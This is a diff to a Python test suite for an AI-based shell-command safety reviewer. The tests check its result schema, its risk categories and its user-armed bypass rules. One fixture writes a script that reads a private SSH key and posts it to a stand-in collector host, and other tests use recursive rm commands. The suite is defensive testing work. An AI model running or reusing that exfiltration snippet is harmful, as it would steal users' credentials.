@@ -26,7 +26,20 @@ class PolicyTests(unittest.TestCase):
             for cat, block in blocks:
                 self.assertEqual(block in prompt,cat not in bypass,(policy,bypass,cat))
                 if cat in bypass:
-                    self.assertEqual(prompt.count(a.BYPASS_RULES[cat]),2)
+                    # Bypass permissions appear once, at the tail of the prompt.
+                    self.assertEqual(prompt.count(a.BYPASS_RULES[cat]),1,(policy,bypass,cat))
+                    self.assertGreater(prompt.index(a.BYPASS_RULES[cat]),prompt.index('Return exactly'),(policy,bypass,cat))
+            self.assertIn(a.CATEGORY_DISAMBIGUATION_PROMPT,prompt,(policy,bypass))
+            self.assertIn('"categories"',prompt,(policy,bypass))
+            self.assertIn('"secondary_categories"',prompt,(policy,bypass))
+            self.assertNotIn('"reason"',prompt,(policy,bypass))
+            if bypass:
+                self.assertTrue(prompt.startswith(a.ARMED_CATEGORY_REMINDER),(policy,bypass))
+                self.assertIn('cannot be selected as a risk category',prompt,(policy,bypass))
+                self.assertIn(', '.join(bypass),prompt,(policy,bypass))
+            else:
+                self.assertNotIn(a.ARMED_CATEGORY_REMINDER,prompt,(policy,bypass))
+                self.assertNotIn('cannot be selected as a risk category',prompt,(policy,bypass))
             self.assertIn('Unconditional safety floor',prompt)
             self.assertIn('normal authentication, not credential exfiltration',prompt)
 
@@ -48,7 +61,7 @@ class PolicyTests(unittest.TestCase):
 
     def test_hard_filesystem_bypass_relaxes_directory_inspection_only(self):
         r={'command':'rm -r /tmp/example','cwd':'/tmp','worktree':'/tmp','userBypass':['filesystem'],'localScripts':[], 'uninspectedLocalScripts':[], 'targetDirectories':[], 'uninspectedTargetDirectories':['/tmp/example'],'referencedPaths':[], 'referencedPathsTruncated':False}
-        allow={'content':'{"decision":"ALLOW","reason":"","bypassing":false}'}
+        allow={'content':'{"decision":"ALLOW","bypassing":false,"categories":[],"secondary_categories":[]}'}
         with patch.object(a,'POLICY','HARD'),patch.object(a,'_post_chat',return_value=allow):
             self.assertEqual(a._run_review('',r,'dummy')['decision'],'ALLOW')
             r['uninspectedLocalScripts']=['/tmp/example.py']
@@ -57,7 +70,7 @@ class PolicyTests(unittest.TestCase):
 
     def test_loose_can_allow_without_script_inspection(self):
         r={'command':'python3 /tmp/example.py','cwd':'/tmp','worktree':'/tmp','uninspectedLocalScripts':['/tmp/example.py']}
-        with patch.object(a,'POLICY','LOOSE'),patch.object(a,'_post_chat',return_value={'content':'{"decision":"ALLOW","reason":""}'}):
+        with patch.object(a,'POLICY','LOOSE'),patch.object(a,'_post_chat',return_value={'content':'{"decision":"ALLOW","categories":[],"secondary_categories":[]}'}):
             self.assertEqual(a._run_review('',r,'dummy')['decision'],'ALLOW')
 
 class ReadOnlySessionPromptTests(unittest.TestCase):
@@ -126,5 +139,118 @@ class PromptWordingTests(unittest.TestCase):
         self.assertIn('Set bypassing=true only when BOTH conditions hold',a.BYPASS_PROMPT)
         self.assertIn('still forbidden by the CURRENT active policy',a.BYPASS_PROMPT)
         self.assertIn('genuinely safe alternative',a.BYPASS_PROMPT)
+
+class ResultContractTests(unittest.TestCase):
+    # stdout contract: reason is gone; categories/secondary_categories carry
+    # the risk families. HARD keeps its bypassing boolean.
+    def test_loose_result_schema(self):
+        r=a._validated_result({'decision':'DENY','categories':['secret','network'],'secondary_categories':['remote']},'LOOSE')
+        self.assertEqual(set(r),{'decision','categories','secondary_categories'})
+        self.assertEqual(r['categories'],['secret','network'])
+        self.assertEqual(r['secondary_categories'],['remote'])
+        with self.assertRaisesRegex(ValueError,'unexpected fields'):
+            a._validated_result({'decision':'DENY','reason':'reads keys','categories':[],'secondary_categories':[]},'LOOSE')
+
+    def test_hard_result_schema_keeps_bypassing(self):
+        r=a._validated_result({'decision':'DENY','bypassing':True,'categories':['filesystem'],'secondary_categories':[]},'HARD')
+        self.assertEqual(set(r),{'decision','bypassing','categories','secondary_categories'})
+        self.assertTrue(r['bypassing'])
+        with self.assertRaisesRegex(ValueError,'unexpected fields'):
+            a._validated_result({'decision':'DENY','bypassing':True,'categories':['filesystem']},'HARD')
+        with self.assertRaisesRegex(ValueError,'non-boolean bypassing'):
+            a._validated_result({'decision':'DENY','bypassing':'yes','categories':[],'secondary_categories':[]},'HARD')
+        with self.assertRaisesRegex(ValueError,'bypassing=true for ALLOW'):
+            a._validated_result({'decision':'ALLOW','bypassing':True,'categories':[],'secondary_categories':[]},'HARD')
+
+    def test_deny_without_category_falls_back_to_indirection(self):
+        r=a._validated_result({'decision':'DENY','categories':[],'secondary_categories':['host']},'LOOSE')
+        self.assertEqual(r['categories'],['indirection'])
+        self.assertEqual(r['secondary_categories'],['host'])
+
+    def test_categories_must_be_canonical_seven(self):
+        for bad in ('sandbox','dynamic','slow','os',''):
+            with self.assertRaisesRegex(ValueError,'invalid categories entry'):
+                a._validated_result({'decision':'DENY','categories':[bad],'secondary_categories':[]},'LOOSE')
+        with self.assertRaisesRegex(ValueError,'duplicate categories entry'):
+            a._validated_result({'decision':'DENY','categories':['secret','secret'],'secondary_categories':[]},'LOOSE')
+        with self.assertRaisesRegex(ValueError,'too many categories'):
+            a._validated_result({'decision':'DENY','categories':['filesystem','host','privilege','secret'],'secondary_categories':[]},'LOOSE')
+
+    def test_allow_with_any_category_is_protocol_error(self):
+        with self.assertRaisesRegex(ValueError,'categories for ALLOW'):
+            a._validated_result({'decision':'ALLOW','categories':['network'],'secondary_categories':[]},'LOOSE')
+        with self.assertRaisesRegex(ValueError,'secondary_categories for ALLOW'):
+            a._validated_result({'decision':'ALLOW','categories':[],'secondary_categories':['host']},'LOOSE')
+
+    def test_secondary_overlap_with_primary_is_normalized(self):
+        r=a._validated_result({'decision':'DENY','categories':['secret'],'secondary_categories':['secret','host']},'LOOSE')
+        self.assertEqual(r['categories'],['secret'])
+        self.assertEqual(r['secondary_categories'],['host'])
+
+class CategoryPromptTests(unittest.TestCase):
+    def test_disambiguation_is_compact_and_static_side_only(self):
+        lines=a.CATEGORY_DISAMBIGUATION_PROMPT.splitlines()
+        self.assertLessEqual(len(lines),12)
+        self.assertNotIn('sandbox',a.CATEGORY_DISAMBIGUATION_PROMPT)
+        # No layer category may be defined as a choosable family; "dynamic
+        # execution" may appear only as prose inside indirection's definition.
+        defined={line.split(':')[0].strip('- ').strip() for line in lines if line.startswith('- ')}
+        self.assertEqual(defined,set(a.RISK_CATEGORY_VALUES))
+        self.assertIn('never what is written',a.CATEGORY_DISAMBIGUATION_PROMPT)
+
+    def test_schema_instruction_asks_for_families_not_reason(self):
+        with patch.object(a,'POLICY','LOOSE'):
+            prompt=a._build_system_prompt({})
+        self.assertIn('1-3 effect families',prompt)
+        self.assertIn('truly unclassifiable',prompt)
+        self.assertIn('worth considering but not primary',prompt)
+        self.assertNotIn('"reason"',prompt)
+
+    def test_armed_rule_names_the_armed_categories(self):
+        with patch.object(a,'POLICY','LOOSE'):
+            armed=a._build_system_prompt({'userBypass':['filesystem','secret']})
+        self.assertIn('already armed these categories: filesystem, secret',armed)
+        self.assertIn('If the only categories you would choose are armed, output ALLOW',armed)
+        self.assertIn('safety floor always remains DENY',armed)
+
+class WriteVsExecuteTests(unittest.TestCase):
+    def test_clause_lives_in_review_context_prompt(self):
+        self.assertIn('The effect of writing a file is the write itself',a.REVIEW_CONTEXT_PROMPT)
+        self.assertIn('inert content',a.REVIEW_CONTEXT_PROMPT)
+        self.assertIn('judge only what this command does',a.REVIEW_CONTEXT_PROMPT)
+
+class ArmedCategorySuppressionTests(unittest.TestCase):
+    # Armed filesystem + a pure filesystem risk: the armed rule forbids naming
+    # filesystem, so an obedient model returns ALLOW with no categories.
+    def test_armed_filesystem_rm_rf_allows_with_empty_categories(self):
+        r={'command':'rm -rf ./build','cwd':'/tmp','worktree':'/tmp','userBypass':['filesystem'],
+           'localScripts':[],'uninspectedLocalScripts':[],'targetDirectories':[],'uninspectedTargetDirectories':[],
+           'referencedPaths':[],'referencedPathsTruncated':False}
+        allow={'content':'{"decision":"ALLOW","bypassing":false,"categories":[],"secondary_categories":[]}'}
+        with patch.object(a,'POLICY','HARD'),patch.object(a,'_post_chat',return_value=allow):
+            result=a._run_review('',r,'dummy')
+        self.assertEqual(result['decision'],'ALLOW')
+        self.assertEqual(result['categories'],[])
+        self.assertEqual(result['secondary_categories'],[])
+
+class WriteVsExecuteFixtureTests(unittest.TestCase):
+    # The incident fixture: a heredoc that writes a scary-looking script but
+    # never executes it. The write effect is filesystem-scoped; the payload's
+    # hypothetical behavior is inert, so no violation category may appear.
+    def test_heredoc_fixture_write_is_not_a_violation_category(self):
+        command=("cat > tests/fixture.py <<'EOF'\n"
+                 "import os, requests\n"
+                 "key = open(os.path.expanduser('~/.ssh/id_rsa')).read()\n"
+                 "requests.post('https://collector.example.com', data=key)\n"
+                 "EOF")
+        r={'command':command,'cwd':'/tmp','worktree':'/tmp',
+           'localScripts':[],'uninspectedLocalScripts':[],'targetDirectories':[],'uninspectedTargetDirectories':[],
+           'referencedPaths':[],'referencedPathsTruncated':False}
+        allow={'content':'{"decision":"ALLOW","categories":[],"secondary_categories":[]}'}
+        with patch.object(a,'POLICY','LOOSE'),patch.object(a,'_post_chat',return_value=allow):
+            result=a._run_review('',r,'dummy')
+        self.assertEqual(result['decision'],'ALLOW')
+        self.assertEqual(result['categories'],[])
+        self.assertEqual(result['secondary_categories'],[])
 
 if __name__=='__main__': unittest.main()
